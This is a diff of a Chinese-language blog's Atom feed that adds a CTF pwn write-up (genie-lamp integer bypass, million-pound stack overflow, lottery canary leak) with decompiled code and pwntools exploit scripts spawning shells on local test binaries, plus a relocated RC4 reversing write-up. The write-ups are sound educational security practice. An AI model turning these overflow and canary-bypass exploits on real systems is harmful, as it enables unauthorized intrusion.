@@ -5,7 +5,7 @@
   <link href="https://dxfaker.top/" rel="alternate" type="text/html"/>
   <link href="https://dxfaker.top/atom.xml" rel="self" type="application/atom+xml"/>
   <id>https://dxfaker.top/</id>
-  <updated>2026-09-10T12:15:20.916Z</updated>
+  <updated>2026-09-10T15:58:38.932Z</updated>
   <language>en</language>
   <entry>
     <title>printf的小巧思</title>
@@ -247,6 +247,324 @@ if __name__ == '__main__':
 为什么必须做：printf("%llx") 把随机数按无符号打印（如 14346747841414464070），而 scanf("%lld") 是有符号解析，最大只接受 9223372036854775807。直接发会解析溢出 → v3 != buf → 登录失败。</p>
 <p>随机数最高位为 1 的概率是 50%，所以这函数直接决定成功率是 50% 还是 100%。</p>
 </blockquote>
+]]></content>
+    <author>
+      <name></name>
+    </author>
+    <category term="wp"></category>
+  </entry>
+  <entry>
+    <title>2026第一周wp</title>
+    <link href="https://dxfaker.top/posts/26moe3/" rel="alternate" type="text/html"/>
+    <id>https://dxfaker.top/posts/26moe3/</id>
+    <published>2026-09-10T00:00:00.000Z</published>
+    <updated>2026-09-10T00:00:00.000Z</updated>
+    <summary>可能这是真的第一次写pwn很舒服吧</summary>
+    <content type="html"><![CDATA[<h1>题外话</h1>
+<p>现在我做封面的技术真的是炉火纯青了</p>
+<p>听v我写的进度很慢，听方大同写的速度就很快</p>
+<p>所以拜拜，洛小妹</p>
+<h1>灯神的愿望</h1>
+<p>checksec</p>
+<pre><code>    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+</code></pre>
+<p>PIE开了说明要找地方泄露地址了</p>
+<p>来看main函数逻辑</p>
+<pre><code>int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // [rsp+4h] [rbp-7Ch] BYREF
+  int v4; // [rsp+8h] [rbp-78h] BYREF
+  unsigned int v5; // [rsp+Ch] [rbp-74h]
+  _BYTE v6[104]; // [rsp+10h] [rbp-70h] BYREF
+  unsigned __int64 v7; // [rsp+78h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  v5 = 1;
+  init(argc, argv, envp);
+  puts("Hello, dear pwner! I am Genie Lamp!");
+  puts("You can only make ONE wish.");
+  puts("What do you want?");
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      puts(&amp;byte_2082);
+      puts("1. Make more wishes");
+      puts("2. Make a normal wish");
+      puts("3. Get flag");
+      printf("&gt; ");
+      __isoc99_scanf("%d", &amp;v3);
+      if ( v3 != 1 )
+        break;
+      puts("How many wishes do you want?");
+      __isoc99_scanf("%d", &amp;v4);
+      if ( v4 &gt; 0 )
+      {
+        puts("Sorry, you can't increase wishes.");
+        exit(0);
+      }
+      v5 = v4;
+      printf("You can still make %u wishes!\n", v4);
+    }
+    if ( v3 == 2 )
+      break;
+    if ( v3 == 3 )
+    {
+      if ( v5 &lt;= 0x1BF51 )
+        puts("Your wishes are not enough...");
+      else
+        win();
+      exit(0);
+    }
+    puts("Invalid choice!");
+  }
+  puts("Tell me your wish:");
+  __isoc99_scanf("%99s", v6);
+  puts("Your wish has been granted!");
+  exit(0);
+}
+</code></pre>
+<p>分析逻辑</p>
+<p>第一轮输入v3</p>
+<p>v3 == 1：</p>
+<p>输入v4,v4大于0退出，小于0赋值给v5,打印v4</p>
+<p>v3 == 2:</p>
+<p>退出</p>
+<p>v3 == 3:</p>
+<p>如果v5的值小于等于1BF51则退出，大于则win()</p>
+<p>看一眼逻辑</p>
+<pre><code>int win()
+{
+  puts("Your endless wishes come true!");
+  return system("/bin/sh");
+}
+</code></pre>
+<p>ok,那我们现在的目标就是找到方法让v4赋值给他，不过提示很明显了，给一个负数就结束战斗了</p>
+<pre><code>pwndbg&gt; c
+Continuing.
+Hello, dear pwner! I am Genie Lamp!
+You can only make ONE wish.
+What do you want?
+
+1. Make more wishes
+2. Make a normal wish
+3. Get flag
+&gt; 2
+Tell me your wish:
+-1
+Your wish has been granted!
+[Inferior 1 (process 9372) exited normally]
+pwndbg&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>from pwn import *
+p = process('./pwn')
+
+p.recvuntil(b"&gt; ")
+p.sendline(b'1')
+p.recvuntil(b"How many wishes do you want?")
+p.sendline(b'-1')
+p.interactive()
+</code></pre>
+<pre><code> python3 reslo.py
+[+] Starting local process './pwn': pid 9957
+[*] Switching to interactive mode
+
+You can still make 4294967295 wishes!
+
+1. Make more wishes
+2. Make a normal wish
+3. Get flag
+&gt; $ 3
+Your endless wishes come true!
+</code></pre>
+<h1>百万英镑</h1>
+<p>checksec</p>
+<pre><code>    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+</code></pre>
+<p>没有canary和PIE</p>
+<p>看main</p>
+<pre><code>int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  _BYTE v4[103]; // [rsp+0h] [rbp-70h] BYREF
+  unsigned __int8 v5; // [rsp+67h] [rbp-9h]
+  unsigned __int64 number; // [rsp+68h] [rbp-8h]
+
+  initialise();
+  puts("== million pound ==");
+  puts("I want one fine million-pound cheque,");
+  puts("one brand-new million-pound cheque,");
+  puts("all the exquisite million-pound cheques,");
+  puts("a few more million-pound cheques on top,");
+  puts("and another million-pound cheque fresh off the press.");
+  puts("That is rather a lot of cheques, sir.");
+  printf("How many should I prepare? ");
+  number = read_number();
+  v5 = cheque_bytes(number);
+  if ( v5 &lt;= 0x60u )
+  {
+    printf("What would you like written, sir? ");
+    read_exact(0, v4, 8 * number);
+    puts("Very good, sir.");
+  }
+  else
+  {
+    puts("That would draw too much attention, sir.");
+  }
+  return 0;
+}
+</code></pre>
+<p>然后看functions表</p>
+<p>查看老演员staff room</p>
+<pre><code>int staff_room()
+{
+  char *argv[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  argv[0] = "/bin/sh";
+  argv[1] = 0;
+  return execve("/bin/sh", argv, 0);
+}
+</code></pre>
+<p>ok现在归纳一下逻辑思路</p>
+<p>第一轮输入决定长度，第二轮输入决定内容</p>
+<p>长度限制为0x60,内容可输入8*长度</p>
+<p>v4的长度为103,位于7*16=112</p>
+<p>且8x6x16明显大于112，所以我可以造一个栈溢出来跳转</p>
+<p>payload=112+8(saved rbp) + 地址</p>
+<p>由于长度，我们可以设一个大一点的剩下没利用的字节就利用垃圾数据填充</p>
+<pre><code>from pwn import *
+
+# p = remote("127.0.0.1", 51742)
+p = process('./million-pound')
+p.recvuntil(b'How many should I prepare? ')
+p.sendline(b'32')
+
+win = 0x401394
+payload = b'A' * 120 + p64(win)
+p.recvuntil(b'What would you like written, sir? ')
+payload += b'B' * (256 - len(payload))
+p.send(payload)
+p.interactive()
+</code></pre>
+<h1>校庆抽奖后台</h1>
+<p>checksec</p>
+<pre><code>    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+</code></pre>
+<p>开PIE说明要去找地方泄露真实地址了,哦对了，还有四凤金丝雀</p>
+<p>再看main函数逻辑</p>
+<pre><code>int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rax
+  unsigned __int16 v5; // [rsp+6h] [rbp-Ah] BYREF
+  unsigned __int64 v6; // [rsp+8h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  alarm(0x1Eu);
+  puts("=== Anniversary Lottery Admin Debug ===");
+  v3 = stack_guard();
+  printf("[trace] active record: %p :: 0x%016lx\n", award_jackpot, v3);
+  puts("[lottery] Submit a two-byte little-endian claim packet length.");
+  puts("[lottery] Send claim packet:");
+  read_exact((char *)&amp;v5, 2u);
+  if ( v5 &amp;&amp; v5 &lt;= 0x100u )
+  {
+    submit_claim(v5);
+    return 0;
+  }
+  else
+  {
+    puts("[lottery] Invalid claim packet length.");
+    return 0;
+  }
+}
+</code></pre>
+<p>点击award_jackpot去看逻辑</p>
+<pre><code>unsigned __int64 award_jackpot()
+{
+  int fd; // [rsp+4h] [rbp-9Ch]
+  ssize_t n; // [rsp+8h] [rbp-98h]
+  _QWORD buf[17]; // [rsp+10h] [rbp-90h] BYREF _QWORD 在 64 位程序中表示 8 字节。buf[17] 的总大小 = 17 × 8 = 136 字节。read 的长度参数 0x7F = 127 字节。
+  unsigned __int64 v4; // [rsp+98h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  memset(buf, 0, 128);
+  fd = open("/flag", 0);
+  if ( fd &lt; 0 )
+  {
+    puts("[lottery] Prize record unavailable.");
+    exit(1);
+  }
+  n = read(fd, buf, 0x7Fu);
+  if ( n &gt; 0 )
+  {
+    write(1, "[lottery] Jackpot awarded: ", 0x1Bu);
+    write(1, buf, n);
+  }
+  close(fd);
+  return v4 - __readfsqword(0x28u);
+}
+</code></pre>
+<p>这不都有flag了吗，</p>
+<p><s>现在是11.41分经过了一段时间的水群以及观察函数逻辑之后，我并没有发现漏洞函数</s></p>
+<p>核心问题</p>
+<blockquote>
+<p><code>submit_claim</code> 的参数 <code>a1</code> 类型是 <code>size_t</code>，但在 <code>main</code> 中传入的是 <code>v5</code>，而 <code>v5</code> 是 <code>unsigned __int16</code>（2 字节）。这里发生了<strong>整数提升/零扩展</strong>：<code>v5</code> 的值（0~65535）被转换为 <code>size_t</code>（64 位无符号）时，高位补 0，因此 <code>a1</code> 的值就等于 <code>v5</code> 的值。</p>
+</blockquote>
+<p>我的理解是v5传递进去之后取了他的长度，但是明显是错误的，可能睡觉时间要到的人就昏头了吧（</p>
+<p>v5的长度是又我决定，而v2只有72字节，那不就大大方方栈溢出了</p>
+<p>而且main函数还有自杀式的打印真实地址+金丝雀的行为，拿条件都符合条件了</p>
+<p>现在算payload</p>
+<p>payload = 72 + canary+ + savedrbp + 后门地址</p>
+<p>exp</p>
+<pre><code>from pwn import *
+
+context.arch = "amd64"
+context.log_level = "info"
+
+p = remote("127.0.0.1", 63440)
+
+p.recvuntil(b"[trace] active record: ")
+leak = p.recvline().strip()
+log.info(f"leak line: {leak}")
+win = int(leak.split(b" ::")[0], 16)
+canary = int(leak.split(b":: 0x")[1], 16)
+
+log.success(f"win    = {hex(win)}")
+log.success(f"canary = {hex(canary)}")
+p.recvuntil(b"[lottery] Send claim packet:")
+size = 0x60
+p.send(p16(size))
+payload = b'A' * 72 + p64(canary) + b'A' * 8 + p64(win)
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>你别说，加log还能看是哪出问题的</p>
+<p>晚安，周末有事，估计暂时更新不了了</p>
 ]]></content>
     <author>
       <name></name>
@@ -3585,125 +3903,6 @@ a = 0               ; 深色模式透明度0
     <category term="经验分享"></category>
   </entry>
   <entry>
-    <title>今日一题</title>
-    <link href="https://dxfaker.top/posts/pywp1/" rel="alternate" type="text/html"/>
-    <id>https://dxfaker.top/posts/pywp1/</id>
-    <published>2026-03-02T00:00:00.000Z</published>
-    <updated>2026-03-02T00:00:00.000Z</updated>
-    <summary>解题思路之类的</summary>
-    <content type="html"><![CDATA[<h1>写在前面</h1>
-<p>镇楼：这样的好兄弟不会再有了</p>
-<p>作为刚踏进这个世界的蛆，自然看到这种加密代码很是头疼，于是便记录下来，以便于之后理清逻辑</p>
-<h1>题目</h1>
-<h2>[SWPUCTF 2021 新生赛]简简单单的解密</h2>
-<pre><code>import base64,urllib.parse
-key = "HereIsFlagggg"
-flag = "xxxxxxxxxxxxxxxxxxx"
-
-s_box = list(range(256))
-j = 0
-for i in range(256):
-    j = (j + s_box[i] + ord(key[i % len(key)])) % 256
-    s_box[i], s_box[j] = s_box[j], s_box[i]
-res = []
-i = j = 0
-for s in flag:
-    i = (i + 1) % 256 #我够吧一时间没反应过来,这个的结果是它本身(i+1)
-    j = (j + s_box[i]) % 256
-    s_box[i], s_box[j] = s_box[j], s_box[i]
-    t = (s_box[i] + s_box[j]) % 256
-    k = s_box[t]
-    res.append(chr(ord(s) ^ k))
-cipher = "".join(res)
-crypt = (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
-enc = str(base64.b64decode(crypt),'utf-8')
-enc = urllib.parse.quote(enc)
-print(enc)
-# enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA
-</code></pre>
-<p>代码解析</p>
-<h3>range(256)</h3>
-<blockquote>
-<p>在 Python 中，range(256) 是一个内置函数 range() 的调用，它生成一个不可变的整数序列，从 0 开始，一直到 255（即包含 0，不包含 256）。换句话说，它产生的数字是：0, 1, 2, 3, ..., 254, 255，总共 256 个数。</p>
-</blockquote>
-<pre><code>   s_box[i], s_box[j] = s_box[j], s_box[i]
-</code></pre>
-<blockquote>
-<p>Python 在赋值时，会先计算等号右边的所有表达式，然后把结果
-同时赋值给左边的变量。</p>
-</blockquote>
-<p>所以这里：
-先取出 s_box[j] 的值，记为 temp_j。
-再取出 s_box[i] 的值，记为 temp_i。
-然后将 temp_j 赋给 s_box[i]，将 temp_i 赋给 s_box[j]。</p>
-<p><strong>这行代码会把 s_box[i] 和 s_box[j] 的值互相交换。</strong></p>
-<pre><code>crypt = (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
-</code></pre>
-<p>这一行代码的作用是将字符串 cipher 进行 Base64 编码，并将结果以字符串形式赋值给变量 crypt。下面逐步拆解：</p>
-<blockquote>
-<p>cipher.encode('utf-8')
-将字符串 cipher 按照 UTF-8 编码转换为字节串（bytes 类型），因为 Base64 编码操作需要输入字节数据。</p>
-<p>base64.b64encode(...)
-对得到的字节串进行 Base64 编码，返回一个新的字节串，内容为 Base64 编码后的 ASCII 字符（例如 b'aGVsbG8='）。</p>
-<p>str(..., 'utf-8')
-将 Base64 编码后的字节串使用 UTF-8 解码为普通的 Python 字符串。这里 str(字节串, encoding) 等价于 字节串.decode(encoding)。由于 Base64 结果只包含 ASCII 字符，用 UTF-8 解码完全正确。</p>
-</blockquote>
-<p>最终 crypt 就得到了一个不含 b'' 前缀的纯 Base64 字符串，可以直接用于后续处理或输出。</p>
-<pre><code>enc = urllib.parse.quote(enc)
-</code></pre>
-<p>这行代码的作用是对字符串 enc 进行 URL 编码（也叫百分号编码），然后将编码后的结果重新赋值给 enc。</p>
-<h3>草稿部分</h3>
-<p>遍历256
-j+=执行的次数+ key的第(i取key长度的余数)位数字符的acsii
-交换sbox中的i,j位数据</p>
-<p>for s in flag
-i+=1
-j=+sbox的j位元素
-交换sbox中的i,j位数据
-t = sbox中的i和j位数据相加(不过256)
-k = sbox[t]
-res有序放入(s转码)^k后的转换的字符
-cipher = res全部字符连成一串
-crypt = 一个不含 b'' 前缀的cipher纯 Base64 字符串，可以直接用于后续处理或输出。
-enc = utf-8的将ctypt字符串化作原始的字符串的字符串
-对enc进行 url编码</p>
-<h2>答案</h2>
-<pre><code>import base64,urllib.parse
-key = "HereIsFlagggg"
-enc = "%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA"
-enc = urllib.parse.unquote(enc)
-s_box = list(range(256))
-j = 0
-
-for i in range(256):
-    j = (j + s_box[i] + ord(key[i % len(key)])) % 256
-    s_box[i], s_box[j] = s_box[j], s_box[i]
-res = []
-i = j = 0
-
-for s in enc:
-    i = (i + 1) % 256
-    j = (j + s_box[i]) % 256
-    s_box[i], s_box[j] = s_box[j], s_box[i]
-    t = (s_box[i] + s_box[j]) % 256
-    k = s_box[t]
-    res.append(chr(ord(s) ^ k))
-cipher = "".join(res)
-print(cipher) 
-</code></pre>
-<h2>反思</h2>
-<p>实际上，我有一些问题：
-·没有总体观念，没有从全局看出他实际上的变动只有a ^ b = c,只需要a = b ^ c即可。
-·对python很不熟悉，因为没学过。</p>
-<p>那也就只有多多写写题目多多积累的事情了</p>
-<pre><code></code></pre>
-]]></content>
-    <author>
-      <name></name>
-    </author>
-    <category term="WP"></category>
-  </entry>
-  <entry>
     <title>词条本1</title>
     <link href="https://dxfaker.top/posts/2632/" rel="alternate" type="text/html"/>
     <id>https://dxfaker.top/posts/2632/</id>
@@ -4064,6 +4263,125 @@ int* intPtr = (int*)ptr;       // 需要强制转换后才能使用
       <name></name>
     </author>
     <category term="entry"></category>
+  </entry>
+  <entry>
+    <title>今日一题</title>
+    <link href="https://dxfaker.top/posts/pywp1/" rel="alternate" type="text/html"/>
+    <id>https://dxfaker.top/posts/pywp1/</id>
+    <published>2026-03-02T00:00:00.000Z</published>
+    <updated>2026-03-02T00:00:00.000Z</updated>
+    <summary>解题思路之类的</summary>
+    <content type="html"><![CDATA[<h1>写在前面</h1>
+<p>镇楼：这样的好兄弟不会再有了</p>
+<p>作为刚踏进这个世界的蛆，自然看到这种加密代码很是头疼，于是便记录下来，以便于之后理清逻辑</p>
+<h1>题目</h1>
+<h2>[SWPUCTF 2021 新生赛]简简单单的解密</h2>
+<pre><code>import base64,urllib.parse
+key = "HereIsFlagggg"
+flag = "xxxxxxxxxxxxxxxxxxx"
+
+s_box = list(range(256))
+j = 0
+for i in range(256):
+    j = (j + s_box[i] + ord(key[i % len(key)])) % 256
+    s_box[i], s_box[j] = s_box[j], s_box[i]
+res = []
+i = j = 0
+for s in flag:
+    i = (i + 1) % 256 #我够吧一时间没反应过来,这个的结果是它本身(i+1)
+    j = (j + s_box[i]) % 256
+    s_box[i], s_box[j] = s_box[j], s_box[i]
+    t = (s_box[i] + s_box[j]) % 256
+    k = s_box[t]
+    res.append(chr(ord(s) ^ k))
+cipher = "".join(res)
+crypt = (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
+enc = str(base64.b64decode(crypt),'utf-8')
+enc = urllib.parse.quote(enc)
+print(enc)
+# enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA
+</code></pre>
+<p>代码解析</p>
+<h3>range(256)</h3>
+<blockquote>
+<p>在 Python 中，range(256) 是一个内置函数 range() 的调用，它生成一个不可变的整数序列，从 0 开始，一直到 255（即包含 0，不包含 256）。换句话说，它产生的数字是：0, 1, 2, 3, ..., 254, 255，总共 256 个数。</p>
+</blockquote>
+<pre><code>   s_box[i], s_box[j] = s_box[j], s_box[i]
+</code></pre>
+<blockquote>
+<p>Python 在赋值时，会先计算等号右边的所有表达式，然后把结果
+同时赋值给左边的变量。</p>
+</blockquote>
+<p>所以这里：
+先取出 s_box[j] 的值，记为 temp_j。
+再取出 s_box[i] 的值，记为 temp_i。
+然后将 temp_j 赋给 s_box[i]，将 temp_i 赋给 s_box[j]。</p>
+<p><strong>这行代码会把 s_box[i] 和 s_box[j] 的值互相交换。</strong></p>
+<pre><code>crypt = (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
+</code></pre>
+<p>这一行代码的作用是将字符串 cipher 进行 Base64 编码，并将结果以字符串形式赋值给变量 crypt。下面逐步拆解：</p>
+<blockquote>
+<p>cipher.encode('utf-8')
+将字符串 cipher 按照 UTF-8 编码转换为字节串（bytes 类型），因为 Base64 编码操作需要输入字节数据。</p>
+<p>base64.b64encode(...)
+对得到的字节串进行 Base64 编码，返回一个新的字节串，内容为 Base64 编码后的 ASCII 字符（例如 b'aGVsbG8='）。</p>
+<p>str(..., 'utf-8')
+将 Base64 编码后的字节串使用 UTF-8 解码为普通的 Python 字符串。这里 str(字节串, encoding) 等价于 字节串.decode(encoding)。由于 Base64 结果只包含 ASCII 字符，用 UTF-8 解码完全正确。</p>
+</blockquote>
+<p>最终 crypt 就得到了一个不含 b'' 前缀的纯 Base64 字符串，可以直接用于后续处理或输出。</p>
+<pre><code>enc = urllib.parse.quote(enc)
+</code></pre>
+<p>这行代码的作用是对字符串 enc 进行 URL 编码（也叫百分号编码），然后将编码后的结果重新赋值给 enc。</p>
+<h3>草稿部分</h3>
+<p>遍历256
+j+=执行的次数+ key的第(i取key长度的余数)位数字符的acsii
+交换sbox中的i,j位数据</p>
+<p>for s in flag
+i+=1
+j=+sbox的j位元素
+交换sbox中的i,j位数据
+t = sbox中的i和j位数据相加(不过256)
+k = sbox[t]
+res有序放入(s转码)^k后的转换的字符
+cipher = res全部字符连成一串
+crypt = 一个不含 b'' 前缀的cipher纯 Base64 字符串，可以直接用于后续处理或输出。
+enc = utf-8的将ctypt字符串化作原始的字符串的字符串
+对enc进行 url编码</p>
+<h2>答案</h2>
+<pre><code>import base64,urllib.parse
+key = "HereIsFlagggg"
+enc = "%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA"
+enc = urllib.parse.unquote(enc)
+s_box = list(range(256))
+j = 0
+
+for i in range(256):
+    j = (j + s_box[i] + ord(key[i % len(key)])) % 256
+    s_box[i], s_box[j] = s_box[j], s_box[i]
+res = []
+i = j = 0
+
+for s in enc:
+    i = (i + 1) % 256
+    j = (j + s_box[i]) % 256
+    s_box[i], s_box[j] = s_box[j], s_box[i]
+    t = (s_box[i] + s_box[j]) % 256
+    k = s_box[t]
+    res.append(chr(ord(s) ^ k))
+cipher = "".join(res)
+print(cipher) 
+</code></pre>
+<h2>反思</h2>
+<p>实际上，我有一些问题：
+·没有总体观念，没有从全局看出他实际上的变动只有a ^ b = c,只需要a = b ^ c即可。
+·对python很不熟悉，因为没学过。</p>
+<p>那也就只有多多写写题目多多积累的事情了</p>
+<pre><code></code></pre>
+]]></content>
+    <author>
+      <name></name>
+    </author>
+    <category term="WP"></category>
   </entry>
   <entry>
     <title>新开档：逆向</title>
